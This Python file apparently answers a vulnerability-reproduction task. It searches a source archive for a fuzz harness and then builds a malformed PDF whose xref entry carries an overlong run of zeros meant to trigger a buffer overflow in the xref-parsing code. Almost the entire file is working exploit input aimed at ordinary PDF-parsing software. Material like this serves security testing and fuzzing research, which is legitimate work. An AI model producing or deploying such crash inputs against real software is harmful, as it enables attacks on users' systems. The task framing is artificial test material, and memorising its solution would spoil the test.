import tarfile


class Solution:
    def _detect_mode(self, src_path: str) -> str:
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name = member.name.lower()
                    if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp")):
                        continue
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    try:
                        data = f.read(1024 * 1024)
                    except Exception:
                        continue
                    text = data.decode("utf-8", "ignore")
                    if "LLVMFuzzerTestOneInput" in text:
                        # Found the fuzz harness file
                        if "processMemoryFile" in text or "processFile" in text:
                            return "pdf"
                        if "read_xrefEntry" in text:
                            return "xref_entry"
                        # Default to pdf if unsure
                        return "pdf"
        except Exception:
            pass
        return "pdf"

    def _build_pdf_poc(self) -> bytes:
        header = b"%PDF-1.4\n"
        xref_offset = len(header)  # offset of "xref" from start of file

        xref = b"xref\n"
        subsection = b"0 1\n"

        # Overlong f1 field consisting only of zeros to trigger the overflow
        f1 = b"0" * 100
        entry = f1 + b" 00000 n \n"

        trailer = b"trailer\n<<>>\n"
        startxref = b"startxref\n" + str(xref_offset).encode("ascii") + b"\n"
        eof = b"%%EOF\n"

        return header + xref + subsection + entry + trailer + startxref + eof

    def _build_xref_entry_poc(self) -> bytes:
        # Direct xref-entry style payload for harnesses that call read_xrefEntry directly
        f1 = b"0" * 100
        return f1 + b" 00000 n \n"

    def solve(self, src_path: str) -> bytes:
        mode = self._detect_mode(src_path)
        if mode == "xref_entry":
            return self._build_xref_entry_poc()
        return self._build_pdf_poc()